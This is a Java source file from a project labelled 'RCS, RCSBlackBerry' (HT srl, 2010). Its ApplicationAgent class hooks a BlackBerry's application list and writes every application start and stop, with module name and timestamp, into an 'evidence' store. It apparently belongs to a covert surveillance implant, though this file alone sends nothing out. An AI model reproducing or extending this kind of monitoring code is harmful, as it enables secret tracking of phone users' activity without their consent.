//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ApplicationAgent.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.agent;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.interfaces.ApplicationObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * log dei start e stop delle applicazioni.
 */
public final class ApplicationAgent extends Agent implements
        ApplicationObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);
    //#endif

    

    //boolean firstRun = true;

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ApplicationAgent(final boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus,
                Conf.AGENT_APPLICATION_ON_SD, "ApplicationAgent");
    }

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ApplicationAgent(final boolean agentStatus,
            final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        //status=Status.getInstance();
        status.applicationAgentFirstRun = true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart addApplicationListObserver");
        //#endif

        AppListener.getInstance().addApplicationObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop removeApplicationListObserver");
        //#endif
        AppListener.getInstance().removeApplicationObserver(this);

    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange START: " + startedName + " "
                + startedMod);
        debug.trace("onApplicationChange STOP: " + stoppedName + " "
                + stoppedMod);
        //#endif

        if (stoppedName != null) {
            writeEvidence(stoppedName, "STOP ", stoppedMod);
        }

        writeEvidence(startedName, "START", startedMod);
    }

    public synchronized void onApplicationListChangeMod(
            final Vector startedList, final Vector stoppedList) {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif

        //#ifdef DEBUG
        //StringBuffer sb = new StringBuffer();
        //debug.info(sb.toString());
        //#endif

        return false;
    }

    private synchronized void writeEvidence(final String appName,
            final String condition, final String mod) {

        //#ifdef DBC
        Check.requires(appName != null, "Null appName");
        Check.requires(mod != null, "Null mod");
        //#endif

        final byte[] tm = (new DateTime()).getStructTm();

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(WChar.getBytes(appName, true));
        items.addElement(WChar.getBytes(condition, true));
        items.addElement(WChar.getBytes(mod, true));
        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

        evidence.atomicWriteOnce(items);

    }

}
